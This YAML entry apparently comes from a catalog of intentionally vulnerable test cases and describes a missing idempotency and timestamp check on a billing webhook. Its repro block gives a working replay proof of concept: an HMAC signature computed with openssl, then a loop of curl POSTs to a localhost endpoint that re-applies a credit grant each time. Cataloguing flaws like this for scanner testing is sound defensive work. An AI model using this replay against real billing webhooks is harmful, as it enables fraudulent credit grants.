  - id: WEBHOOK-REPLAY-001
    title: Inbound webhook has no idempotency/timestamp check (signed-delivery replay)
    class: ImproperAuthentication
    cwe: CWE-294
    owasp: "API2:2023"
    tier: 1
    origin: api
    endpoint: "POST /api/webhooks/inbound/billing"
    severity: High
    auth: none
    detector: diver_webhook_sig
    gating: VF_HARDENED
    deterministic: true
    secured_twin: WEBHOOK-REPLAY-001-SAFE
    intentional: true
    repro: |
      # Capture (or compute, given the shared secret) ONE correctly-signed
      # delivery, then POST it repeatedly - each replay re-applies the credit
      # grant because there is no idempotency/timestamp check:
      SIG="sha256=$(printf '%s' "$BODY" | openssl dgst -sha256 -hmac "$WHSEC" -r | cut -d' ' -f1)"
      for i in 1 2 3; do
        curl -s -X POST http://localhost:8081/api/webhooks/inbound/billing-replay-vuln \
          -H "X-VF-Signature: $SIG" -H "Content-Type: application/json" -d "$BODY"
      done   # -> balance increases on every replay of the same signed delivery.

